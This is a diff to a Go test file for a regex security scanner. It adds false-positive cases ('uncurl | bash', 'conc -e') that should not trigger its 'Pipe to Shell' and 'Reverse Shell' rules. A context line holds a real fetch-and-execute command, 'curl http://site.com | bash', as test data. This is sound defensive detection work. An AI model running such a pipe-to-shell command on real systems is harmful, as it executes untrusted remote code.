@@ -117,6 +117,16 @@ func TestRegexScanner_Scan(t *testing.T) {
 			content:     "echo \\#; curl http://site.com | bash",
 			wantFinding: "Pipe to Shell",
 		},
+		{
+			name:        "False Positive: Uncurl",
+			content:     "uncurl | bash",
+			wantFinding: "", // Should NOT match "Pipe to Shell"
+		},
+		{
+			name:        "False Positive: Conc Dependency",
+			content:     "conc -e matching",
+			wantFinding: "", // Should NOT match "Reverse Shell"
+		},
 	}
 
 	for _, tt := range tests {
